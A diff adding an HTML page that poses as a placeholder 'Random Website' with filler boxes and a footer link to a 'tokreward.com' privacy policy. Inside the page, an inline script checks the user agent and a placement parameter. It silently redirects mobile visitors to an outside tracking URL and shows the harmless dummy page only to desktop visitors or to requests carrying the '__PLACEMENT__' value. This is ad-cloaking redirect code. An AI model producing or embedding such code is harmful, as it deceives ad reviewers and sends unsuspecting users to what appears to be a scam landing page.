@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Random Website</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+    .container {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      grid-gap: 20px;
+      padding: 20px;
+    }
+    .box {
+      background-color: #f2f2f2;
+      padding: 20px;
+      text-align: center;
+    }
+    .footer {
+      background-color: #333;
+      color: #fff;
+      padding: 10px;
+      text-align: center;
+    }
+    .footer a {
+      color: #fff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; }
+    else { }
+  </script>
+  <div class="container">
+    <div class="box">
+      <h2>Box 1</h2>
+      <p>This is the content for Box 1.</p>
+    </div>
+    <div class="box">
+      <h2>Box 2</h2>
+      <p>This is the content for Box 2.</p>
+    </div>
+    <div class="box">
+      <h2>Box 3</h2>
+      <p>This is the content for Box 3.</p>
+    </div>
+    <div class="box">
+      <h2>Box 4</h2>
+      <p>This is the content for Box 4.</p>
+    </div>
+    <div class="box">
+      <h2>Box 5</h2>
+      <p>This is the content for Box 5.</p>
+    </div>
+    <div class="box">
+      <h2>Box 6</h2>
+      <p>This is the content for Box 6.</p>
+    </div>
+  </div>
+  <div class="footer">
+    <p>&copy; 2023 Random Website. <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+  </div>
+</body>
+</html>
